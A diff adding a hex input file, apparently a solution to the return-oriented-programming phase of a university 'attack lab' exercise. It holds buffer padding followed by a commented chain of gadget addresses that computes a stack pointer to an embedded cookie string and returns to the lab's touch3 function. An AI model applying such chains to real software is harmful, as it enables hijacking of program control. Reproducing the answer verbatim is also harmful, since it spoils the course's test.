@@ -1,0 +1,17 @@
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00  
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00  
+06 1a 40 00 00 00 00 00 # [mov %rsp, %rax], offset from here
+a2 19 40 00 00 00 00 00 # [mov %rax, %rdi]
+ab 19 40 00 00 00 00 00 # return to [pop %rax]
+48 00 00 00 00 00 00 00 # pop the offset to %rax
+42 1a 40 00 00 00 00 00 # [mov %eax, %edx]
+69 1a 40 00 00 00 00 00 # [mov %edx, %ecx]
+27 1a 40 00 00 00 00 00 # [mov %ecx, %esi]
+d6 19 40 00 00 00 00 00 # call [add_xy] to add rsp and offset to %eax
+a2 19 40 00 00 00 00 00 # [mov %rax, %rdi]
+fa 18 40 00 00 00 00 00 # return to touch3
+35 39 62 39 39 37 66 61 # [object string], offset to here
+00 00 00 00 00 00 00 00
